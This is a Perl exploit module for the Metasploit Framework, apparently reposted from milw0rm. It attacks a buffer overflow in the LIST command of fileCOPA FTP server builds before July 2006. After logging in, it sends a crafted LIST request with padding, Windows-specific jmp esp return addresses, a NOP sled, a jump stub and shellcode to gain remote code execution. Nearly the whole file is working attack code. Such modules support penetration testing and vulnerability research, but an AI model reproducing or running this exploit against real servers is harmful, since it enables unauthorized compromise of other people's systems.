##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::filecopa_list;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'FileCopa FTP Server pre 18 Jul Version',
	'Version' => '$Revision: 0.1 $',
	'Authors' =>
	  [ 
		'Jacopo Cervini <acaro [at] jervus.it>'
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'test'],
		'PASS'  => [1, 'DATA', 'Password', 'test'],
	  },

	'Payload' =>
	  {
		'Space'  => 400,
		'BadChars'  => "\x00\x0a\x0d",
		# 'Prepend'	=> "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
        This module exploits the buffer overflow found in the LIST command
        in fileCOPA FTP server pre 18 Jul 2006 version discovered by www.appsec.ch.    
}),

	'Refs'  =>
	  [
		['BID', '19065'],
		
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [

		['Windows 2000 SP4 English',	160, 0x7c2e7993 ], # jmp esp in ADVAPI32.dll
		['Windows 2000 SP4 Italian',	160, 0x79277993 ], # jmp esp in ADVAPI32.dll
		['Windows XP SP2 English',	240, 0x77df2740 ], # jmp esp in ADVAPI32.dll
		
		

	  ],

	'Keys' => ['filecopa'],

	'DisclosureDate' => 'Jul 19 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}


sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];




	
	
	my $jmp = "\x66\x81\xc1\xa0\x01\x51\xc3";

	#66:81C1 A001   ADD CX,1A0
	#51             PUSH ECX
	#C3             RETN
    

	my $pattern = ("A" x $target->[1]);
         $pattern .= pack('V', $target->[2]);
	   $pattern .= ("\x90"x4);
	   $pattern .= $jmp;
	   $pattern .= ("\x90"x283);
	   $pattern .= $shellcode; 

	   
	my $request = "A " . $pattern ."\r\n";

	

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("USER " . $self->GetVar('USER') . "\r\n");
	$r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);


	$s->Send("PASS ".$self->GetVar('PASS')."\r\n");
	$r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp esp at 0x%.8x...", $target->[2]));


	$s->Send("LIST $request");
	
	sleep(2);
	return;
}

# milw0rm.com [2007-01-09]
